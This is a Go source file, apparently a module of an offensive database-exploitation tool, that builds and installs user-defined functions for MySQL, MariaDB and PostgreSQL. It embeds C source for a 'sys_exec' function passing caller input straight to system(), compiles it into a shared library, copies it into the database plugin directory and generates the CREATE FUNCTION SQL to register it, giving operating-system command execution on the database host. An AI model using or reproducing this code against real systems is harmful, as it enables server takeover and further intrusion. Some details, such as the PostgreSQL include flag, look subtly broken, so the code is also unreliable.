package modules

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

type UDFManager struct {
	engine EngineInterface
}

func NewUDFManager(engine EngineInterface) *UDFManager {
	return &UDFManager{engine: engine}
}

func (u *UDFManager) IsUDfSupported(dbms string) bool {
	supported := []string{"MySQL", "MariaDB", "PostgreSQL"}
	for _, s := range supported {
		if strings.EqualFold(s, dbms) {
			return true
		}
	}
	return false
}

func (u *UDFManager) CompileAndInstall(dbms string, pluginDir string) (bool, string) {
	var soPath string
	var err error

	switch dbms {
	case "MySQL", "MariaDB":
		soPath, err = u.compileMySQLUDF()
	case "PostgreSQL":
		soPath, err = u.compilePostgresUDF()
	default:
		return false, "UDF not supported for " + dbms
	}

	if err != nil {
		return false, fmt.Sprintf("compile failed: %v", err)
	}

	dest := filepath.Join(pluginDir, filepath.Base(soPath))
	input, err := os.ReadFile(soPath)
	if err != nil {
		return false, fmt.Sprintf("read .so failed: %v", err)
	}
	if err := os.WriteFile(dest, input, 0755); err != nil {
		return false, fmt.Sprintf("write .so failed: %v", err)
	}

	return true, dest
}

func (u *UDFManager) compileMySQLUDF() (string, error) {
	src := `
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mysql/plugin.h>

typedef unsigned long long my_ulonglong;

extern "C" {
my_ulonglong sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
    if (args->arg_count < 1) return 0;
    system(args->args[0]);
    return 0;
}

my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
    return 0;
}
}
`
	tmpDir, err := os.MkdirTemp("", "udf")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	srcPath := filepath.Join(tmpDir, "udf.cpp")
	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
		return "", err
	}

	outPath := filepath.Join(tmpDir, "udf.so")
	cmd := exec.Command("g++", "-shared", "-fPIC", "-o", outPath, srcPath,
		"-I/usr/include/mysql", "-I/usr/include/mariadb")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s: %v", string(output), err)
	}

	return outPath, nil
}

func (u *UDFManager) compilePostgresUDF() (string, error) {
	src := `
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

PG_MODULE_MAGIC;

extern "C" {
PG_FUNCTION_INFO_V1(sys_exec);
Datum sys_exec(PG_FUNCTION_ARGS) {
    char *cmd = text_to_cstring(PG_GETARG_TEXT_P(0));
    system(cmd);
    PG_RETURN_BOOL(true);
}
}
`
	tmpDir, err := os.MkdirTemp("", "udf")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	srcPath := filepath.Join(tmpDir, "udf.c")
	if err := os.WriteFile(srcPath, []byte(src), 0644); err != nil {
		return "", err
	}

	outPath := filepath.Join(tmpDir, "udf.so")
	pgConfig := exec.Command("pg_config", "--includedir-server")
	incPath, err := pgConfig.Output()
	if err != nil {
		incPath = []byte("-I/usr/include/postgresql/server")
	}

	cmd := exec.Command("gcc", "-shared", "-fPIC", "-o", outPath, srcPath,
		strings.TrimSpace(string(incPath)))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s: %v", string(output), err)
	}

	return outPath, nil
}

func (u *UDFManager) GetUDFInstallSQL(dbms string, udfName string, soPath string) string {
	switch dbms {
	case "MySQL", "MariaDB":
		return fmt.Sprintf("CREATE FUNCTION %s RETURNS INTEGER SONAME '%s';", udfName, filepath.Base(soPath))
	case "PostgreSQL":
		return fmt.Sprintf("CREATE OR REPLACE FUNCTION %s(text) RETURNS bool AS '%s', '%s' LANGUAGE C STRICT;", udfName, soPath, udfName)
	default:
		return ""
	}
}
